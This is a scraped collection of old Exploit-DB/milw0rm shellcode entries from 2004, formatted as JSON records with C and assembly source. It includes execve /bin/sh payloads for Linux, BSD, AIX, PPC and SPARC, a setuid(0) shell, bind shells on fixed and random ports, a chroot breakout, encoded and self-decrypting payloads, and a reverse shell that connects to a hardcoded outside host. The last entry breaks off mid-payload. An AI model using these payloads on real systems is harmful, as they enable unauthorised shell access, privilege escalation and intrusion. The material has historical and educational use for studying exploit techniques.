{"Title": "Linux/x86 - execve(/bin/sh) + ToLower Encoded Shellcode (41 bytes)", "Author": "anonymous", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13457.c", "View": "https://old.exploit-db.com/raw/13457/", "code": ["/*", " *  Linux/x86", " *  tolower() evasion, execve() /bin/sh ", " *  (eg use: various qpop exploits)", " */", "", "#include <stdio.h>", "", "char c0de[] =", "/* main: */", "\"\\xeb\\x1b\"                                   /* jmp callz                  */", "/* start: */", "\"\\x5e\"                                       /* popl %esi                  */", "\"\\x89\\xf3\"                                   /* movl %esi, %ebx            */", "\"\\x89\\xf7\"                                   /* movl %esi, %edi            */", "\"\\x83\\xc7\\x07\"                               /* addl $0x07, %edi           */", "\"\\x29\\xc0\"                                   /* subl %eax, %eax            */", "\"\\xaa\"                                       /* stosb %al, %es:(%edi)      */", "\"\\x89\\xf9\"                                   /* movl %edi, %ecx            */", "\"\\x89\\xf0\"                                   /* movl %esi, %eax            */", "\"\\xab\"                                       /* stosl %eax, %es:(%edi)     */", "\"\\x89\\xfa\"                                   /* movl %edi, %edx            */", "\"\\x29\\xc0\"                                   /* subl %eax, %eax            */", "\"\\xab\"                                       /* stosl %eax, %es:(%edi)     */", "\"\\xb0\\x08\"                                   /* movb $0x08, %al            */", "\"\\x04\\x03\"                                   /* addb $0x03, %al            */", "\"\\xcd\\x80\"                                   /* int $0x80                  */", "/* callz: */", "\"\\xe8\\xe0\\xff\\xff\\xff\"                       /* call start                 */", "/* DATA */", "\"/bin/sh\";", "", "main() {", "        int *ret;", "        ret=(int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(c0de));", "        (*ret) = (int)c0de;", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 / Unix/SPARC / IRIX/MIPS - execve(/bin/sh) Shellcode (141 bytes)", "Author": "dymitri", "Published": ": 2004-09-12", "Platform": "Multiple", "Download": "https://old.exploit-db.com/download/13467.c", "View": "https://old.exploit-db.com/raw/13467/", "code": ["/*", "Shellcode ejecuta execve /bin/sh en Irix/mips, Linux/x86, Unix/sparc by dymitr1", "dymitri666@hotmail.com", "*/", "", "#include <stdio.h>", "", "char code[]=", "\"\\x37\\x37\\xeb\\x2f\\x30\\x80\\x00\\x12\\x04\\x10\\xff\\xff\\x24\\x02\\x03\\xf3\\x23\\xff\\x02\\x14\\x23\\xe4\\xfe\\x08\"", "\"\\x23\\xe5\\xfe\\x10\\xaf\\xe4\\xfe\\x10\\xaf\\xe0\\xfe\\x14\\xa3\\xe0\\xfe\\x0f\"", "\"\\x03\\xff\\xff\\xcc\"", "\"/bin/sh\" ", "\"\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\"", "\"\\x37\\x37\\x37\\x37\\x37\"", "\"\\x21\\x0b\\xd8\\x9a\\xa0\\x14\\x21\\x6e\\x23\\x0b\\xcb\\xdc\\xa2\\x14\\x63\\x68\"", "\"\\xe0\\x3b\\xbf\\xf0\\xc0\\x23\\xbf\\xf8\\x90\\x23\\xa0\\x10\\xc0\\x23\\xbf\\xec\"", "\"\\xd0\\x23\\xbf\\xe8\\x92\\x23\\xa0\\x18\\x94\\x22\\x80\\x0a\\x82\\x10\\x20\\x3b\"", "\"\\x91\\xd0\\x20\\x08\\x82\\x10\\x20\\x01\\x91\\xd0\\x20\\x08\"; ", "main()", "{", "  void (*s)() = (void *)code;", "  printf(\"Shellcode length: %d\\nExecuting..\\n\\n\",", "      strlen(code));", "  s();", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 / Unix/SPARC - execve(/bin/sh) Shellcode (80 bytes)", "Author": "dymitri", "Published": ": 2004-09-12", "Platform": "Multiple", "Download": "https://old.exploit-db.com/download/13468.c", "View": "https://old.exploit-db.com/raw/13468/", "code": ["/*", " *  Linux/x86 and Unix/Sparc", " *", " *   execve() of /bin/sh by dymitri!!!", " *  ", " */", "", "#include <stdio.h>", "", "char wcode[]=", "", "        \"\\x90\\x90\\xeb\\x34\\x21\\x0b\\xd8\\x9a\\xa0\\x14\\x21\\x6e\\x23\\x0b\\xcb\\xdc\"", "        \"\\xa2\\x14\\x63\\x68\\xe0\\x3b\\xbf\\xf0\\xc0\\x23\\xbf\\xf8\\x90\\x23\\xa0\\x10\"", "        \"\\xc0\\x23\\xbf\\xec\\xd0\\x23\\xbf\\xe8\\x92\\x23\\xa0\\x18\\x94\\x22\\x80\\x0a\"", "        \"\\x82\\x10\\x20\\x3b\\x91\\xd0\\x20\\x08\"", "        \"\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\";", "", "main()", "{", "  void (*s)() = (void *)wcode;", "  printf(\"MULtiplataforma: %d\\n\\n\",", "      strlen(wcode));", "  s();", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "BSD/x86 / Linux/x86 - execve(/bin/sh) Shellcode (38 bytes)", "Author": "dymitri", "Published": ": 2004-09-12", "Platform": "Multiple", "Download": "https://old.exploit-db.com/download/13469.c", "View": "https://old.exploit-db.com/raw/13469/", "code": ["/*", " *  Linux/x86 and Bsd/x86", " *", " *   execve() of /bin/sh by dymitri!!!", " *", " */", "", "", "", "#include <stdio.h>", "char", "code[] =", "        \"\\x31\\xc0\"  ", "        \"\\x50\"                                 ", "        \"\\x68\\x2f\\x2f\\x73\\x68\"                  ", "        \"\\x68\\x2f\\x62\\x69\\x6e\"                  ", "        \"\\x89\\xe3\"                              ", "        \"\\x50\"                                 ", "        \"\\x54\"                                  ", "        \"\\x53\"                                  ", "        \"\\x50\"                                 ", "        \"\\x8c\\xe0\"              ", "        \"\\x21\\xc0\"             ", "        \"\\x74\\x04\"                                 ", "        \"\\xb0\\x3b\"              ", "        \"\\xeb\\x07\" /* si es bsd saltamos los 7 bytes para llegar al int $0x80 */                       ", "        \"\\xb0\\x0b\"", "        \"\\x99\"     /* En caso contrario si %fs es igual a 0 configuramos para que la ejecucion sea sobre linux */                  ", "        \"\\x52\"                          ", "        \"\\x53\"                         ", "        \"\\x89\\xe1\"                      ", "        \"\\xcd\\x80\";             ", "main()", "{", "  void (*s)() = (void *)code;", "  printf(\"Shellcode length: %d\\nExecuting..\\n\\n\",", "      strlen(code));", "  s();", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "AIX - execve(/bin/sh) Shellcode (88 bytes)", "Author": "Georgi Guninski", "Published": ": 2004-09-26", "Platform": "AIX", "Download": "http://shell-storm.org/shellcode/files/shellcode-132.php", "View": null, "code": ["/*", " *  Aix", " *  execve() of /bin/sh Georgi Guninski (guninski@hotmail.com)", " */", "", "unsigned int code[]={", "  0x7c0802a6 , 0x9421fbb0 , 0x90010458 , 0x3c60f019 ,", "  0x60632c48 , 0x90610440 , 0x3c60d002 , 0x60634c0c ,", "  0x90610444 , 0x3c602f62 , 0x6063696e , 0x90610438 ,", "  0x3c602f73 , 0x60636801 , 0x3863ffff , 0x9061043c ,", "  0x30610438 , 0x7c842278 , 0x80410440 , 0x80010444 ,", "  0x7c0903a6 , 0x4e800420, 0x0", "};", "", "/*      disassembly", "  7c0802a6        mfspr   r0,LR", "  9421fbb0        stu     SP,-1104(SP) --get stack", "  90010458        st      r0,1112(SP)", "  3c60f019        cau     r3,r0,0xf019 --CTR", "  60632c48        lis     r3,r3,11336  --CTR", "  90610440        st      r3,1088(SP)", "  3c60d002        cau     r3,r0,0xd002 --TOC", "  60634c0c        lis     r3,r3,19468  --TOC", "  90610444        st      r3,1092(SP)", "  3c602f62        cau     r3,r0,0x2f62 --'/bin/sh\\x01'", "  6063696e        lis     r3,r3,26990", "  90610438        st      r3,1080(SP)", "  3c602f73        cau     r3,r0,0x2f73", "  60636801        lis     r3,r3,26625", "  3863ffff        addi    r3,r3,-1", "  9061043c        st      r3,1084(SP) --terminate with 0", "  30610438        lis     r3,SP,1080", "  7c842278        xor     r4,r4,r4    --argv=NULL", "  80410440        lwz     RTOC,1088(SP)", "  80010444        lwz     r0,1092(SP) --jump", "  7c0903a6        mtspr   CTR,r0", "  4e800420        bctr              --jump", "*/", "", "# milw0rm.com [2004-09-26]"]},
{"Title": "BSD/PPC - execve(/bin/sh) Shellcode (128 bytes)", "Author": "Palante", "Published": ": 2004-09-26", "Platform": "BSD_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-107.php", "View": null, "code": ["/*", " *  Linux PPC shellcode", " *  execve() of /bin/sh by Palante", " */", "", "long shellcode[] = { /* Palante's BSD PPC shellcode w/ NULL*/", "  0x7CC63278, 0x2F867FFF, 0x41BC005C, 0x7C6802A6,", "  0xB0C3FFF9, 0xB0C3FFF1, 0x38867FF0, 0x38A67FF4,", "  0x38E67FF3, 0x7CA52278, 0x7CE72278, 0x7C853A14,", "  0x7CC419AE, 0x7C8429D6, 0x7C842214, 0x7C043A14,", "  0x7CE72850, 0x7C852A14, 0x7C63212E, 0x7C832214,", "  0x7CC5212E, 0x7CA52A78, 0x44FFFF02, 0x7CE03B78,", "  0x44FFFF02, 0x4BFFFFA9, 0x2F62696E, 0x2F73685A,", "  0xFFFFFFFF, 0xFFFFFFFF", "}; ", "", "", "void main()", "{", "  __asm__(\"b shellcode\");", "}", "", "/*              disassembly", "", "        .section \".text\"      # Palante's BSD PPC shellcode", "        .align 2", "        .globl m", "        .type    m,@function", "m:", "\txor  6,6,6            # r6 is 0", "\tcmpi  7,0,6,0x7FFF    # do meaningless compare", "        bc 13,28,L2           # conditional branch to L2 # CAUSES NULL BYTE", "L1:     mfspr 3,8\t      # address of /bin/sh into r3 (execve parameter)", "\t\t\t", "\tsth  6,-7(3)          # fix sc opcode", "\tsth  6,-15(3)         # fix sc opcode", "\t", "\taddi 4,6,0x7FF0", "\taddi 5,6,0x7FF4", "\taddi 7,6,0x7FF3", "\txor  5,5,4            #got 0x4 into r5", "\txor  7,7,4            #got 0x3 into r7", "", "\t", "\tadd  4,5,7            # r4 = 0x7", "\tstbx 6,4,3            # store null after /bin/sh", "", "\tmullw 4,4,5           # r4 = 0x1c (28)", "        add  4,4,4            # r4 = 0x38 (56)", "\tadd  0,4,7            # this makes 59 which is the execve system call", "        ", "        sub  7,5,7            # r7 = 0x1 for exit system call\t", "", "        add  4,5,5            # r4 = 0x8", "        stwx 3,3,4            # and store pointer to /bin/sh at r3+0x8", "\tadd  4,3,4            # r4 = r3 + 0x8 (execve parameter)", "\tstwx 6,5,4            # store NULL pointer", "        xor 5,5,5             # NULL (execve parameter)", ".long   0x44ffff02            # not quite an sc opcode", "\tor 0,7,7              # syscall 1 - exit", ".long   0x44ffff02            # not quite an sc opcode", "", "L2:     bl L1                 # branch and link back to L1", ".long 0x2F62696E              #/bin/shZ", ".long 0x2F73685A", ".long 0xffffffff              # this is where pointer to /bin/sh goes", ".long 0xffffffff              # this is where null pointer goes", "", ".Lfe1:", ".size    m,.Lfe1-m", "", "*/", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "BSD/x86 - execve(/bin/sh) Shellcode (27 bytes)", "Author": "n0gada", "Published": ": 2004-09-26", "Platform": "BSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-93.php", "View": null, "code": ["/* execve_sh.c by n0gada\t", "   27 bytes.", "*/", "#include <stdio.h>", "", "char shellcode[]=", "\"\\xeb\\x0d\\x5f\\x31\\xc0\\x50\\x89\\xe2\"", "\"\\x52\\x57\\x54\\xb0\\x3b\\xcd\\x80\\xe8\"", "\"\\xee\\xff\\xff\\xff/bin/sh\";", "", "int main(void)", "{", " int *ret;", "", "\tprintf(\"%d\\n\",strlen(shellcode));\t", "\tret = (int *)&ret+2;", "\t*ret = (int)shellcode;", "", "return 0;", "", "}", "", "/*********************************************", "execve_sh.s", "", "\t.globl main", "\tmain:", "\t\tjmp strings", "\tstart:", "\t\tpop %edi", "\t\txorl %eax,%eax", "\t\tpush %eax", "\t\tmovl %esp,%edx", "\t\tpush %edx", "\t\tpush %edi", "\t\tpush %esp", "\t\tmovb $0x3b,%al", "\t\tint $0x80", "", "\tstrings: call start", "\t\t.string \"/bin/sh\"", "", "*********************************************/", "", "// milw0rm.com [2004-09-26]"]}
]

const pag_11 = [{"Title": "BSD/x86 - execve(/bin/sh) + setuid(0) Shellcode (29 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-26", "Platform": "BSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-92.php", "View": null, "code": ["/*", "   *BSD version", "   FreeBSD, OpenBSD, NetBSD.", "", "   s0t4ipv6@shellcode.com.ar", "", "   29 bytes.", "", "   -setuid(0);", "   -execve(/bin/sh);", "*/", "", "char shellcode[]=", "", "   \"\\x31\\xc0\"                      // xor          %eax,%eax", "   \"\\x50\"                          // push         %eax", "   \"\\xb0\\x17\"                      // mov          $0x17,%al", "   \"\\x50\"                          // push         %eax", "   \"\\xcd\\x80\"                      // int          $0x80", "   \"\\x50\"                          // push         %eax", "   \"\\x68\\x6e\\x2f\\x73\\x68\"          // push         $0x68732f6e", "   \"\\x68\\x2f\\x2f\\x62\\x69\"          // push         $0x69622f2f", "   \"\\x89\\xe3\"                      // mov          %esp,%ebx", "   \"\\x50\"                          // push         %eax", "   \"\\x54\"                          // push         %esp", "   \"\\x53\"                          // push         %ebx", "   \"\\x50\"                          // push         %eax", "   \"\\xb0\\x3b\"                      // mov          $0x3b,%al", "   \"\\xcd\\x80\";                     // int          $0x80", "", "main()", "{", "   int *ret;", "   printf(\"Shellcode lenght=%d\\n\",sizeof(shellcode));", "   ret=(int*)&ret+2;", "   (*ret)=(int)shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "BSD/x86 - Bind (31337/TCP) Shell Shellcode (83 bytes)", "Author": "no1", "Published": ": 2004-09-26", "Platform": "BSD_x86", "Download": "https://old.exploit-db.com/download/13248.c", "View": "https://old.exploit-db.com/raw/13248/", "code": ["/* portbinding execve() shellcode (port 31337) bsd/x86 (83b) - no1 (greyhats.za.net) */", "", "char shellc0de[]=", "  \"\\x99\"                        // cdq", "  \"\\x52\"                        // pushl %edx ", "  \"\\x6a\\x01\"                    // pushl $0x01", "  \"\\x6a\\x02\"                    // pushl $0x02", "  \"\\xb0\\x61\"                    // movb $0x61,%al", "  \"\\x50\"                        // pushl %eax", "  \"\\xcd\\x80\"                    // int $0x80", "  \"\\x52\"                        // pushl %edx", "  \"\\x68\\xff\\x02\\x7a\\x69\"        // pushl $0x697a02ff", "  \"\\x89\\xe3\"                    // movl %esp,%ebx", "  \"\\x6a\\x10\"                    // push $0x10", "  \"\\x53\"                        // pushl %ebx", "  \"\\x50\"                        // pushl %eax", "  \"\\x93\"                        // xchg %eax,%ebx", "  \"\\x31\\xc0\"                    // xorl %eax,%eax", "  \"\\xb0\\x68\"                    // movb $0x68,%al", "  \"\\x50\"                        // pushl %eax", "  \"\\xcd\\x80\"                    // int $0x80", "  \"\\x53\"                        // pushl %ebx", "  \"\\xb0\\x6a\"                    // movb $0x6a,%al", "  \"\\x50\"                        // pushl %eax", "  \"\\xcd\\x80\"                    // int $0x80", "  \"\\x31\\xc0\"                    // xorl %eax,%eax", "  \"\\x50\"                        // pushl %eax", "  \"\\x50\"                        // pushl %eax", "  \"\\x53\"                        // pushl %ebx", "  \"\\xb0\\x1e\"                    // movb $0x1e,%al", "  \"\\x50\"                        // pushl %eax", "  \"\\xcd\\x80\"                    // int $0x80", "  \"\\x93\"                        // xchg %eax,%ebx", "  \"\\x89\\xc1\"                    // movl %eax,%ecx", "                                // looper:", "  \"\\x31\\xc0\"                    // xor %eax,%eax", "  \"\\x51\"                        // pushl %ecx", "  \"\\x53\"                        // pushl %ebx", "  \"\\xb0\\x5a\"                    // movb $0x5a,%al", "  \"\\x50\"                        // pushl %eax", "  \"\\xcd\\x80\"                    // int $0x80", "  \"\\x49\"                        // decl %ecx", "  \"\\x79\\xf4\"                    // jns looper", "  \"\\x50\"                        // pushl %eax", "  \"\\x68\\x2f\\x2f\\x73\\x68\"        // pushl $0x68732f2f", "  \"\\x68\\x2f\\x62\\x69\\x6e\"        // pushl $0x6e69622f", "  \"\\x89\\xe3\"                    // movl %esp,%ebx", "  \"\\x50\"                        // pushl %eax", "  \"\\x54\"                        // pushl %esp", "  \"\\x53\"                        // pushl %ebx", "  \"\\xb0\\x3b\"                    // movb $0x3b,%al", "  \"\\x50\"                        // pushl %eax", "  \"\\xcd\\x80\";                   // int $0x80", "", "int", "main()", "{", "  void(*sc)()=(void *)shellc0de;", "  printf(\"\\nportbinding execve() shellcode (port 31337) bsd/x86 (%db) - no1 (greyhats.za.net)\\n\",strlen(shellc0de));", "  sc();", "  return;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "BSD/x86 - Bind (Random TCP Port) Shell Shellcode (143 bytes)", "Author": "MayheM", "Published": ": 2004-09-26", "Platform": "BSD_x86", "Download": "https://old.exploit-db.com/download/13249.c", "View": "https://old.exploit-db.com/raw/13249/", "code": ["/*", "Here is a BSD remote shellcode. ", "Tested on NetBSD . SHould work on FreeBSD and OpenBSD .", "", "by MayheM", "ExileCrew (www.exile2k.org)", "*/", "", "/*", "** 143 bytes", "*/", "char shellcode[] = ", "\"\\x31\\xC0\"", "\"\\x50\"", "\"\\x50\"", "\"\\xB0\\x17\"", "\"\\xCD\\x80\"      // setuid", "\"\\x31\\xC0\"", "\"\\x50\"", "\"\\x50\"", "\"\\xB0\\xB5\"", "\"\\xCD\\x80\"      // setgid", "\"\\xEB\\x60\"", "\"\\x5E\"", "\"\\x31\\xC0\"", "\"\\x89\\x46\\x04\"", "\"\\x88\\x46\\x17\"", "\"\\x6A\\x06\"", "\"\\x6A\\x01\"", "\"\\x6A\\x02\"", "\"\\xb0\\x61\"", "\"\\x50\"", "\"\\xCD\\x80\"      // socket", "\"\\x89\\xc7\"", "\"\\x31\\xc0\"", "\"\\x6a\\x10\"", "\"\\x56\"", "\"\\x57\"", "\"\\xb0\\x68\"", "\"\\x50\"", "\"\\xCD\\x80\"      // bind", "\"\\x6A\\x01\"", "\"\\x57\"", "\"\\xb0\\x6A\"", "\"\\x50\"", "\"\\xCD\\x80\"      // listen", "\"\\x50\"", "\"\\x50\"", "\"\\x57\"", "\"\\xB0\\x1E\"", "\"\\x50\"", "\"\\xCD\\x80\"      //accept", "\"\\x89\\xc7\"", "\"\\x31\\xDB\"", "\"\\x31\\xc9\"", "\"\\xb1\\x03\"", "\"\\x49\"", "\"\\x31\\xc0\"", "\"\\xb0\\x5A\"", "\"\\x51\"", "\"\\x57\"", "\"\\x50\"", "\"\\xcd\\x80\"      // dup2", "\"\\x39\\xd9\"", "\"\\x75\\xf2\"", "\"\\x31\\xc0\"", "\"\\x89\\x76\\x18\"", "\"\\x89\\x46\\x1c\"", "\"\\x8D\\x56\\x1c\"", "\"\\x8D\\x4E\\x18\"", "\"\\x83\\xc6\\x10\"", "\"\\x52\"", "\"\\x51\"", "\"\\x56\"", "\"\\xb0\\x3b\"", "\"\\x50\"", "\"\\xcd\\x80\"      // execve", "\"\\xe8\\x9b\\xff\\xff\\xff\"", "\"\\xc0\\x02\\x7a\\x69\\x90\\x90\\x90\\x90\\xc0\\xd5\\xbf\\xef\\xb8\\xd5\\xbf\\xef\"", "\"/bin/sh\";", "", "", "", "", "", "", "/*", "** ASM shellcode", "*/", "fct()", "{", "  __asm__(\"", "", "", "xorl  %eax, %eax", "pushl %eax", "pushl %eax", "movb  $0x17, %al", "int   $0x80 ", "", "xorl  %eax, %eax", "pushl %eax", "pushl %eax", "movb  $0xB5, %al", "int   $0x80 ", "", "", "", "jmp  data", "code:", "popl  %esi", "xorl  %eax, %eax", "movl  %eax, 0x04(%esi)", "movb  %al , 0x17(%esi)", "", "pushl $0x06", "pushl $0x01", "pushl $0x02", "movb  $0x61, %al", "pushl %eax", "int   $0x80", "", "movl  %eax, %edi", "xorl  %eax, %eax", "pushl $0x10", "pushl %esi", "pushl %edi", "movb  $0x68, %al", "pushl %eax", "int   $0x80", "", "pushl $0x01", "pushl %edi", "movb  $0x6A, %al", "pushl %eax", "int   $0x80", "", "pushl %eax", "pushl %eax", "pushl %edi", "movb  $0x1E, %al", "pushl %eax", "int   $0x80", "", "movl  %eax, %edi", "xorl  %ebx, %ebx", "xorl  %ecx, %ecx", "movb  $0x03, %ecx", "loop:", "decl  %ecx", "xorl  %eax, %eax", "movb  $0x5A, %al", "pushl %ecx", "pushl %edi", "pushl %eax", "int   $0x80", "cmpl  %ebx, %ecx", "jne   loop", "", "xorl  %eax, %eax", "movl  %esi, 0x18(%esi) ", "movl  %eax, 0x1C(%esi)", "leal  0x1C(%esi), %edx", "leal  0x18(%esi), %ecx", "addl  $0x10, %esi", "pushl %edx", "pushl %ecx", "pushl %esi", "movb  $0x3B, %al", "pushl %eax", "int   $0x80", "", "data:", "call  code", ".string \\\"\\xC0\\x02\\x7A\\x69\\x90\\x90\\x90\\x90\\xC0\\xD5\\xBF\\xEF\\xB8\\xD5\\xBF\\xEF\\\"", ".string \\\"/bin/sh\\x90\\\"", "\");", "}", "", "", "", "", "/*", "** Test", "*/", "main()", "{", "  void  (*fct)();", "  ", "  printf(\"shellcode lenght = %d bytes \\n\", sizeof(shellcode));", "  fct = (void *) shellcode;", "  fct();", "}", "", "", "", "", "", "/*", "** C shellcode", "*/", "trojan()", "{", "  int                   clientsock;", "  int                   serversock;", "  char                  *server;", "  char                  *args[2];", "  ", "  server = \"\\xC0\\x02\\x7A\\x69\\x00\\x00\\x00\\x00\\xC0\\xD5\\xBF\\xEF\\xB8\\xD5\\xBF\\xEF\";", "  args[0] = \"/bin/sh\";", "  args[1] = 0x00;", "  setuid(0);", "  setgid(0);", "  serversock = socket(0x02, 0x01, 0x06);", "  bind(serversock, server, 0x10);", "  listen(serversock, 0x01);", "  clientsock = accept(serversock, 0x00, 0x00);", "  dup2(clientsock, 0x02);", "  dup2(clientsock, 0x01);", "  dup2(clientsock, 0x00);", "  execve(args[0], args, args[1]);", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "BSD/x86 - Break chroot Shellcode (45 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-26", "Platform": "BSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-356.php", "View": null, "code": ["/*", "   *BSD version", "   FreeBSD, OpenBSD, NetBSD.", "", "   s0t4ipv6@shellcode.com.ar", "", "   45 bytes.", "", "   -break chrooted", "*/", "", "char shellcode[]=", "", "    \"\\x68\\x62\\x2e\\x2e\\x2e\" /* pushl   $0x2e2e2e62            */", "    \"\\x89\\xe7\"             /* movl    %esp,%edi              */", "    \"\\x33\\xc0\"             /* xorl    %eax,%eax              */", "    \"\\x88\\x47\\x03\"         /* movb    %al,0x3(%edi)          */", "    \"\\x57\"                 /* pushl   %edi                   */", "    \"\\xb0\\x88\"             /* movb    $0x88,%al              */", "    \"\\x50\"                 /* pushl   %eax                   */", "    \"\\xcd\\x80\"             /* int     $0x80                  */", "    \"\\x57\"                 /* pushl   %edi                   */", "    \"\\xb0\\x3d\"             /* movb    $0x3d,%al              */", "    \"\\x50\"                 /* pushl   %eax                   */", "    \"\\xcd\\x80\"             /* int     $0x80                  */", "    \"\\x47\"                 /* incl    %edi                   */", "    \"\\x33\\xc9\"             /* xorl    %ecx,%ecx              */", "    \"\\xb1\\xff\"             /* movb    $0xff,%cl              */", "    \"\\x57\"                 /* pushl   %edi                   */", "    \"\\x50\"                 /* pushl   %eax                   */", "    \"\\xb0\\x0c\"             /* movb    $0x0c,%al              */", "    \"\\xcd\\x80\"             /* int     $0x80                  */", "    \"\\xe2\\xfa\"             /* loop    <shellcode +31>        */", "    \"\\x47\"                 /* incl    %edi                   */", "    \"\\x57\"                 /* pushl   %edi                   */", "    \"\\xb0\\x3d\"             /* movb    $0x3d,%al              */", "    \"\\x50\"                 /* pushl   %eax                   */", "    \"\\xcd\\x80\";            /* int     $0x80                  */", "", "main()", "{", "   int *ret;", "   printf(\"Shellcode lenght=%d\\n\",sizeof(shellcode));", "   ret=(int*)&ret+2;", "   (*ret)=(int)shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "BSD/x86 - execve(/bin/sh) Encoded Shellcode (49 bytes)", "Author": "dev0id", "Published": ": 2004-09-26", "Platform": "BSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-362.php", "View": null, "code": ["/* Self decripting (dec/inc) shellcode executes /bin/sh", "   Size  49 bytes", "   OS\t   *BSD", "  \t\t/rootteam/dev0id\t(www.sysworld.net)", "\t\t\tdev0id@uncompiled.com ", "", "BITS\t32", "jmp\tshort\tshellcode", "main:", "\tpop\tesi", "\txor\tecx,ecx", "\tmov\tcl,28", "main_decript:\t", "\tinc byte [esi+ecx]", "\tloop\tmain_decript", "\tinc byte [esi]", "\tpush\tesi", "\tret\t", "", "", "shellcode:", "call\tmain", "", "db \t0xea,0x0d,0x5d,0x30,0xbf,0x87,0x45,0x06,0x4f,0x53,0x55,0xaf,0x3a,0x4f,0xcc", "db\t0x7f,0xe7,0xec,0xfe,0xfe,0xfe,0x2e,0x61,0x68,0x6d,0x2e,0x72,0x67", "*/", "", "char shellcode[] =", "\t\"\\xeb\\x0e\\x5e\\x31\\xc9\\xb1\\x1c\\xfe\\x04\\x0e\\xe2\\xfb\\xfe\\x06\\x56\"", "\t\"\\xc3\\xe8\\xed\\xff\\xff\\xff\\xea\\x0d\\x5d\\x30\\xbf\\x87\\x45\\x06\\x4f\"", "\t\"\\x53\\x55\\xaf\\x3a\\x4f\\xcc\\x7f\\xe7\\xec\\xfe\\xfe\\xfe\\x2e\\x61\\x68\"", "\t\"\\x6d\\x2e\\x72\\x67\";", "", "int", "main(void)", "{", "\tint *ret;", "\tret = (int*)&ret + 2;", "\t(*ret) = shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "BSD/x86 - execve(/bin/sh) + Encoded Shellcode (57 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-26", "Platform": "BSD_x86", "Download": "https://old.exploit-db.com/download/13252.c", "View": "https://old.exploit-db.com/raw/13252/", "code": ["/*", "   *BSD version", "   FreeBSD, OpenBSD, NetBSD.", "", "   s0t4ipv6@shellcode.com.ar", "", "   57 bytes.", "", "   -Encriptado execve(/bin/sh);", "", "   Para mas informacion ver", "   http://www.shellcode.com.ar/es/proyectos.html", "*/", "", "char shellcode[]=", "\"\\xeb\\x1b\\x5e\\x31\\xc0\\x6a\\x1a\\x6a\\x17\\x59\\x49\\x5b\\x8a\\x04\\x0e\"", "\"\\xf6\\xd3\\x30\\xd8\\x88\\x04\\x0e\\x50\\x85\\xc9\\x75\\xef\\xeb\\x05\\xe8\"", "\"\\xe0\\xff\\xff\\xff\\x0e\\x6f\\xc7\\xf9\\xbe\\xa3\\xe4\\xff\\xb8\\xff\\xb2\"", "\"\\xf4\\x1f\\x95\\x4c\\xfb\\xf8\\xfc\\x1f\\x74\\x09\\xb2\\x65\";", "", "main()", "{", "   int *ret;", "   printf(\"Shellcode lenght=%d\\n\",sizeof(shellcode));", "   ret=(int*)&ret+2;", "   (*ret)=(int)shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "BSD/x86 - Reverse (torootteam.host.sk:2222/TCP) Shell Shellcode (93 bytes)", "Author": "dev0id", "Published": ": 2004-09-26", "Platform": "BSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-360.php", "View": null, "code": ["/*  the back-connect shellcode. The destination addr is", "0x28402ec3 (rootteam.host.sk) port is 0x8ae (2222).", "size = 93 bytes (little isn't it?)", "Greetz 2 sp00fed", "\twritten  by \t\tdev0id #rus-sec /EFnet (rootteam.host.sk)", "", "BITS\t32", "", "jmp short\tpath", "main:", "\tpop\tesi", "\txor\teax,eax", "\tmov byte [esi+1],0x02 \t; filling the sock_addr struct", "\tmov word [esi+2],0x08ae", "\tmov long [esi+4],0x28402ec3 ;(here your addr: rootteam.host.sk)", "\tpush byte 0x06\t\t;int socket(int domain,int type, int proto) ", "\tpush byte 0x01", "\tpush byte 0x02", "\tmov\tal,97\t\t;/usr/include/sys/syscall.h (socket)", "\tpush\teax", "\tint\t0x80", "\tmov \tedx,eax\t\t;now in edx we have the descriptor", "\tpush byte 0x10\t\t;making connect", "\tlea\teax,[esi]", "\tpush\teax", "\tpush\tedx\t\t;eax is our socket descriptor", "\txor\teax,eax", "\tmov\tal,98\t\t;/usr/include/sys/syscall.h (connect)", "\tpush\teax", "\tint\t0x80", "\tmov\tcl,3", "\tmov\tebx,-1", "loop_1:\t\t\t\t;making dup2 3 times", "\tinc\tebx", "\tpush\tebx", "\tpush\tedx", "\tmov\tal,90", "\tpush\teax", "\tint\t0x80", "\tloopnz\tloop_1", "\txor\teax,eax", "\tpush    eax", "\tpush long 0x68732f2f", "\tpush long 0x6e69622f", "\tmov\tedx,esp", "\tpush\teax", "\tpush\tesp", "\tpush\tedx", "\tmov\tal,59\t\t;/usr/include/sys/syscall.h(execve)", "\tpush\teax", "\tint\t0x80 ", "path:", "\tcall \tmain", "\tdb 'A'\t", "*/", "char shellcode[] =", "\t\"\\xeb\\x56\\x5e\\x31\\xc0\\xc6\\x46\\x01\\x02\\x66\\xc7\\x46\\x02\\xae\\x08\"", "\t\"\\xc7\\x46\\x04\\xc3\\x2e\\x40\\x28\\x6a\\x06\\x6a\\x01\\x6a\\x02\\xb0\\x61\"", "\t\"\\x50\\xcd\\x80\\x89\\xc2\\x6a\\x10\\x8d\\x06\\x50\\x52\\x31\\xc0\\xb0\\x62\"", 